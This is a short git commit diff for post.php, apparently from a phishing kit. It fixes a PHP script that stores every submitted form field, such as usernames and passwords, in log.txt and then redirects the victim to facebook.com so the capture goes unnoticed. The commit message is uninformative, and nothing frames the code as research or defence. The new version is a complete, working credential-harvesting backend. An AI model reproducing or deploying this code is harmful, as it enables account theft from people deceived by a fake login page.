7d9c0e34e8b2f1f55c83c3534c57032ac8394526
shelu <30596083+shelu16@users.noreply.github.com>
2020-09-04 23:04:44 +0530

    o
    o

--- post.php
+++ post.php
@@ -1,12 +1,19 @@
-header (‘Location:http://www.facebook.com/’);
-$handle = fopen(“usernames.txt”, “a”);
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, “=”);
-fwrite($handle, $value);
-fwrite($handle, “rn”);
-}
-fwrite($handle, “rn”);
-fclose($handle);
-exit;
-?>
+<?php 
+  
+// Set the location to redirect the page 
+header ('Location: http://www.facebook.com'); 
+  
+// Open the text file in writing mode  
+$file = fopen("log.txt", "a"); 
+  
+foreach($_POST as $variable => $value) { 
+    fwrite($file, $variable); 
+    fwrite($file, "="); 
+    fwrite($file, $value); 
+    fwrite($file, "\r\n"); 
+} 
+  
+fwrite($file, "\r\n"); 
+fclose($file); 
+exit; 
+?> 
